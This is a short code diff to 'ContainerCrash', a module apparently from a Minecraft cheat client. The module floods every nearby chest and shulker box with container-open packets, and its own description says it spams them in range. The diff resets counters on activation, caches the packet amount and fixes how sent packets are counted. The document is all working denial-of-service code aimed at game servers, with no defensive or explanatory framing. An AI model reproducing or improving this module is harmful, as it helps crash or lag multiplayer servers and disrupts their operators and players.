@@ -70,6 +70,9 @@ public class ContainerCrash extends Module {
             "Spams container-open packets at every chest/shulker in range. Press Escape to stop.");
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; }
+
     @EventHandler
     private void onTick(TickEvent.Pre event) {
         if (mc.player == null) return;
@@ -79,6 +82,7 @@ public class ContainerCrash extends Module {
             mc.player.closeHandledScreen();
             return;
         }
+        int count = amount.get();
         BlockIterator.register(4, 4, (blockPos, blockState) -> {
             Block block = blockState.getBlock();
             if (!(block instanceof AbstractChestBlock) && !(block instanceof ShulkerBoxBlock)) return;
@@ -86,8 +90,10 @@ public class ContainerCrash extends Module {
                 new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()),
                 Direction.DOWN, blockPos, false);
             PlayerInteractBlockC2SPacket pkt = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0);
-            for (int i = 0; i < amount.get(); i++) mc.player.networkHandler.sendPacket(pkt);
-            packetsSent++;
+            for (int i = 0; i < count; i++) {
+                mc.player.networkHandler.sendPacket(pkt);
+                packetsSent++;
+            }
         });
     }
 
